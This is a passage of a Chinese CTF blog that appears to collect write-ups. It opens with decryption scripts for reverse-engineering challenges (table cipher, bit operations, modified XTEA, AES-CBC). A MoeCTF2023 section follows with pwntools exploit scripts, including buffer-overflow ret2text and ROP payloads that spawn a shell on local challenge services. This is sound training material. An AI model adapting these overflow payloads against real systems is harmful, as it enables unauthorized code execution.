<span class="number">120</span>, <span class="number">37</span>, <span class="number">46</span>, <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>,</span><br><span class="line">                    <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>, <span class="number">31</span>, <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>, <span class="number">62</span>,</span><br><span class="line">                    <span class="number">181</span>, <span class="number">102</span>, <span class="number">72</span>, <span class="number">3</span>, <span class="number">246</span>, <span class="number">14</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">87</span>, <span class="number">185</span>,</span><br><span class="line">                    <span class="number">134</span>, <span class="number">193</span>, <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>, <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>,</span><br><span class="line">                    <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>, <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">223</span>,</span><br><span class="line">                    <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>, <span class="number">66</span>, <span class="number">104</span>, <span class="number">65</span>, <span class="number">153</span>,</span><br><span class="line">                    <span class="number">45</span>, <span class="number">15</span>, <span class="number">176</span>, <span class="number">84</span>, <span class="number">187</span>, <span class="number">22</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>((<span class="type">char</span> *) s2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;len = %d\n&quot;</span>, len);</span><br><span class="line">    srand(<span class="number">1400333646</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> rand_v4 = rand();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> chr = <span class="number">0</span>; chr &gt;= <span class="number">0</span>; ++chr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Table[(<span class="type">unsigned</span> <span class="type">char</span>) (chr + rand_v4 % <span class="number">255</span>)] == s2[i]) &#123;</span><br><span class="line">                <span class="built_in">putchar</span>(chr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得就是上面这个,应该没什么问题…</p><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025191743587.png" alt="image-20231025191743587" style="zoom:50%;" /><h2 id="stl-1">STL_1</h2><p>不知道STL是什么先去学c++吧…</p><p>这个题就是要能够读懂程序,STL经过编译后,IDA分析出来的函数名很长,实际上关键的就是那一点:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025192248287.png" alt="image-20231025192248287"></p><p>熟悉c++的话这题代码分析起来没难度…</p><p>难点在于对加密过程进行逆向.</p><p>程序中先对字符串进行reverse,然后执行了若干位运算,重点是位运算.</p><p>最后的检查flag是否正确还有一部分位运算变换,并且是将4个字符(4字节)作为一个int进行解释,然后进行位操作的.</p><p>将一个int的32个位展开,逐步分析各个位操作,最终能整理出如何一点点的进行逆向,最终我们需要多步操作逐渐将这32个位分别进行还原,由于后来写的WP(其实是懒),逻辑直接放代码里了…</p><p>解密脚本:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> v15[<span class="number">11</span>];</span><br><span class="line">    <span class="type">uint32_t</span> flag[<span class="number">11</span>];</span><br><span class="line">    v15[<span class="number">0</span>] = <span class="number">0x2882D802120E</span>LL;</span><br><span class="line">    v15[<span class="number">1</span>] = <span class="number">0x28529A05954</span>LL;</span><br><span class="line">    v15[<span class="number">2</span>] = <span class="number">0x486088C03</span>LL;</span><br><span class="line">    v15[<span class="number">3</span>] = <span class="number">0xC0FB3B55754</span>LL;</span><br><span class="line">    v15[<span class="number">4</span>] = <span class="number">0xC2B9B7F8651</span>LL;</span><br><span class="line">    v15[<span class="number">5</span>] = <span class="number">0xAE83FB054C</span>LL;</span><br><span class="line">    v15[<span class="number">6</span>] = <span class="number">0x29ABF6DDCB15</span>LL;</span><br><span class="line">    v15[<span class="number">7</span>] = <span class="number">0x10E261FC807</span>LL;</span><br><span class="line">    v15[<span class="number">8</span>] = <span class="number">0x2A82FE86D707</span>LL;</span><br><span class="line">    v15[<span class="number">9</span>] = <span class="number">0xE0CB79A5706</span>LL;</span><br><span class="line">    v15[<span class="number">10</span>] = <span class="number">0x330560890D06</span>LL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// uint32_t f就是当前处理的4个字符---视为一个4字节的整数进行位操作</span></span><br><span class="line">    <span class="comment">// 下面的f[i-j]代表对f的i-j编号的二进制位进行处理</span></span><br><span class="line">    <span class="comment">// 例如f[0]代表最低的0位(最右边的位)</span></span><br><span class="line">    <span class="comment">// 操作完成后f就是局部的一段明文</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 同理,t就是密文</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// f[14-0] = t[14-0]</span></span><br><span class="line">    <span class="comment">// f[29-15] = t[29-15] ^ f[14-0]</span></span><br><span class="line">    <span class="comment">// f[31-30] = t[31-30] ^ f[16-15]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> t = v15[i];</span><br><span class="line">        <span class="type">uint32_t</span> f = <span class="number">0</span>;</span><br><span class="line">        f += t &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">        f += (((t &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x7FFF</span>) ^ (f &amp; <span class="number">0x7FFF</span>)) &lt;&lt; <span class="number">15</span>;</span><br><span class="line">        f += (((t &gt;&gt; <span class="number">30</span>) &amp; <span class="number">0x3</span>) ^ ((f &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x3</span>)) &lt;&lt; <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">        flag[i] = f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *p = (<span class="type">unsigned</span> <span class="type">char</span> *) flag;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">42</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        p[i] ^= p[i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    std::<span class="built_in">reverse</span>((<span class="type">char</span>*)flag, (<span class="type">char</span>*)flag + <span class="number">44</span>); <span class="comment">// reverse 这个字符串</span></span><br><span class="line">    <span class="comment">// std::reverse(p, p + 43);</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025193234519.png" alt="image-20231025193234519" style="zoom:50%;" /><h2 id="ez-chal">ez_chal</h2><p>久远了,就存着个解密代码了.是个魔改XTEA:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">XTEA_encrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">XTEA_decryot</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">-0x61C88747</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">        v1 -= v0 ^ (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^</span><br><span class="line">              (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= v1 ^ (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v4[] = &#123;</span><br><span class="line">            <span class="number">156</span>, <span class="number">162</span>, <span class="number">158</span>, <span class="number">193</span>, <span class="number">135</span>, <span class="number">31</span>, <span class="number">9</span>, <span class="number">220</span>, <span class="number">59</span>, <span class="number">227</span>,</span><br><span class="line">            <span class="number">246</span>, <span class="number">145</span>, <span class="number">122</span>, <span class="number">92</span>, <span class="number">154</span>, <span class="number">246</span>, <span class="number">32</span>, <span class="number">159</span>, <span class="number">82</span>, <span class="number">147</span>,</span><br><span class="line">            <span class="number">225</span>, <span class="number">148</span>, <span class="number">91</span>, <span class="number">138</span>, <span class="number">155</span>, <span class="number">6</span>, <span class="number">29</span>, <span class="number">249</span>, <span class="number">64</span>, <span class="number">227</span>,</span><br><span class="line">            <span class="number">176</span>, <span class="number">35</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> key[] = &#123;</span><br><span class="line">            <span class="number">78</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">33</span>, <span class="number">78</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">119</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">33</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        XTEA_decryot(&amp;((<span class="type">uint32_t</span> *) v4)[<span class="number">2</span> * i], (<span class="type">uint32_t</span> *) key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, (<span class="type">char</span> *) v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="let-s-go">Let’s GO</h2><p>GO逆向,有一个反调试:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114204614556.png" alt="image-20231114204614556"></p><p>这里的异或操作是在生成真正的<code>iv</code>,用于后续的<code>AES加密</code>.</p><p>调试可得是将位于<code>0x3F56C0</code>的字符串<code>NewStar!NewStar!</code>进行依次异或.(实际上这个字符串是AES的key)</p><br><p>接下来真正的main中,<code>qword_436096</code>存储的就是密文,不过要根据这个十六进制字符串生成字节流才行.</p><p>不过这几行纯靠猜…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114204829077.png" alt="image-20231114204829077"></p><br><p>动调到ASE加密的函数这里,检查参数:<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114205117672.png" alt="image-20231114205117672" style="zoom:50%;" /></p><p>可以知道字符串<code>NewStar!NewStar!</code>就是使用到的key.</p><br><p>再后面这里看到是CBC模式,并且前面发现的那个反调试控制的异或操作对应的数组就是iv:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114205638886.png" alt="image-20231114205638886"></p><p>(这么看来前面那个<code>crypto_aes_NewCipher()</code>是初始化加密环境的函数)</p><p>现在为止已经分析清楚了,可以编写脚本了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># iv</span></span><br><span class="line">iv_original = [</span><br><span class="line">    <span class="number">78</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">33</span>, <span class="number">78</span>, <span class="number">101</span>,</span><br><span class="line">    <span class="number">119</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">33</span></span><br><span class="line">]</span><br><span class="line">iv = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> iv_original:</span><br><span class="line">    iv += <span class="built_in">chr</span>(i ^ <span class="number">0x32</span>)</span><br><span class="line">iv = iv.encode()</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># key</span></span><br><span class="line">key = <span class="string">b&#x27;NewStar!NewStar!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enc</span></span><br><span class="line">enc_list = [</span><br><span class="line">    <span class="number">101</span>, <span class="number">101</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">52</span>, <span class="number">98</span>, <span class="number">49</span>, <span class="number">51</span>,</span><br><span class="line">    <span class="number">102</span>, <span class="number">102</span>, <span class="number">56</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">56</span>, <span class="number">54</span>, <span class="number">102</span>, <span class="number">56</span>, <span class="number">101</span>,</span><br><span class="line">    <span class="number">52</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">54</span>, <span class="number">102</span>, <span class="number">53</span>, <span class="number">100</span>,</span><br><span class="line">    <span class="number">50</span>, <span class="number">53</span>, <span class="number">101</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">51</span>, <span class="number">97</span>, <span class="number">51</span>, <span class="number">102</span>, <span class="number">100</span>,</span><br><span class="line">    <span class="number">48</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">54</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">56</span>, <span class="number">56</span>,</span><br><span class="line">    <span class="number">99</span>, <span class="number">98</span>, <span class="number">55</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">98</span>, <span class="number">56</span>, <span class="number">98</span>, <span class="number">49</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">56</span>, <span class="number">99</span>, <span class="number">52</span>, <span class="number">52</span></span><br><span class="line">]</span><br><span class="line">enc = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> enc_list)</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt</span></span><br><span class="line">aes = AES.new(key, mode=AES.MODE_CBC, iv=iv)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(enc))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114205849539.png" alt="image-20231114205849539" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp-MoeCTF2023</title>
      <link href="/20239c84791e243a/"/>
      <url>/20239c84791e243a/</url>
      
        <content type="html"><![CDATA[<p>比赛结束前就很长时间没打了,很多exp都删掉了…</p><p>贴一些自己还留着的exp…</p><h1 id="pwn">PWN</h1><h2 id="baby-calculator">baby_calculator</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;14721&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./canary1&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Now..start!\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    line = p.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    line_list = line.decode().split(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    left = <span class="built_in">int</span>(line_list[<span class="number">0</span>])</span><br><span class="line">    right = <span class="built_in">int</span>(line_list[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    result = <span class="built_in">int</span>(line_list[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> left + right == result:</span><br><span class="line">        p.sendline(<span class="string">&#x27;BlackBird&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;WingS&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="int-overflow">int_overflow</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;string.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;bits/stdc++.h&gt;</span></span><br><span class="line"><span class="comment">// #include &quot;all.h&quot;</span></span><br><span class="line"><span class="comment">//在linux下执行!!!</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i = ~(<span class="number">1</span> &lt;&lt; <span class="number">31</span>); <span class="comment">//2147483647</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">i = <span class="number">1</span> &lt;&lt; <span class="number">31</span>; <span class="comment">//-2147483648</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"><span class="type">char</span> str[] = <span class="string">&quot;4294852782&quot;</span>;<span class="comment">//2147483647+(-114514-(-2147483648))+1</span></span><br><span class="line"><span class="comment">//别问我为啥这么算</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, atoi(str));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ret2text-32">ret2text_32</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">12933</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./canary1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常规的跳转到system</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x58</span></span><br><span class="line">_system = <span class="number">0x08049070</span></span><br><span class="line">bin_sh = <span class="number">0x0804C02C</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (offset + <span class="number">4</span>) + p32(_system) + p32(<span class="number">1</span>) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ret2text-64">ret2text_64</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2071</span>)</span><br><span class="line"><span class="comment"># p = gdb.debug(&quot;./pwn&quot;, &quot;b *(vuln)&quot;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># 偏移就是0x50...不是0x54</span></span><br><span class="line">offset = <span class="number">0x50</span> + <span class="number">8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4011be</span></span><br><span class="line">_system = <span class="number">0x401090</span></span><br><span class="line">bin_sh = <span class="number">0x404050</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(_system)</span><br><span class="line"><span class="comment"># 注意这里需要一个ret来堆栈平衡---坑点</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># print(str(len(payload)))</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="shellcode-level0">shellcode_level0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 